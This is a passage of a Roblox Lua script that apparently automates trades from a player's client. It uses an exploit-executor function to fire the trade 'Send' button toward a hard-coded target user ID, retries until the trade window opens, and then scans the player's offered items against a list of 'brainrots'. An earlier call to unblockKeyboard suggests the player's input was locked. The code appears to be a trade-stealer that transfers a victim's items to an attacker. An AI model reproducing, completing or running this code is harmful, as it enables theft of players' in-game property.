    unblockKeyboard()

    local function hasSelections()
        local tradeWindow = player.PlayerGui:FindFirstChild("TradeLiveTrade")
        if not tradeWindow then return false end
        local sc = tradeWindow:FindFirstChild("TradeLiveTrade")
        if sc then sc = sc:FindFirstChild("Your") end
        if sc then sc = sc:FindFirstChild("ScrollingFrame") end
        if not sc then return false end
        
        for _, child in pairs(sc:GetChildren()) do
            if child.Name:match("^Selection") then
                return true
            end
        end
        return false
    end
    
    local maxAttempts = CONFIG.MAX_TRADE_ATTEMPTS
    local attempt = 0
    local tradeSent = false
    
    while not tradeSent and attempt < maxAttempts do
        attempt = attempt + 1
        
        local sendButton = nil
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn.Name == "Send" and btn:IsA("ImageButton") then
                local path = btn:GetFullName()
                if path:match("TradePlayerList") and (path:match(targetUserId)) then
                    sendButton = btn
                    break
                end
            end
        end
        
        if sendButton then
            for _, c in pairs(getconnections(sendButton.Activated)) do c:Fire() end
            tradeSent = true
        end
        
        if tradeSent then
            waitR(1, 1.5)
            if hasSelections() then
                break
            else
                tradeSent = false
            end
        end
        
        if not tradeSent and attempt < maxAttempts then
            waitR(CONFIG.RETRY_DELAY, CONFIG.RETRY_DELAY + 0.2)
        end
    end

    waitR(3, 4)

    local tradeWindow = nil
    for _ = 1, 20 do
        tradeWindow = player.PlayerGui:FindFirstChild("TradeLiveTrade")
        if tradeWindow then break end
        waitR(0.5, 1)
    end

    if tradeWindow then
        local sc = tradeWindow.TradeLiveTrade.Your.ScrollingFrame
        for _ = 1, 20 do
            local has = false
            for _, c in pairs(sc:GetChildren()) do
                if c.Name:match("^Selection") then
                    has = true
                    break
                end
            end
            if has then break end
            waitR(0.3, 0.6)
        end

        for _, s in pairs(sc:GetChildren()) do
            if s.Name:match("^Selection") then
                local sp = s:FindFirstChild("Spacer")
                if sp then
                    local title = sp:FindFirstChild("Title")
                    if title then
                        for _, br in pairs(brainrotsList) do
                            if title.Text == br then
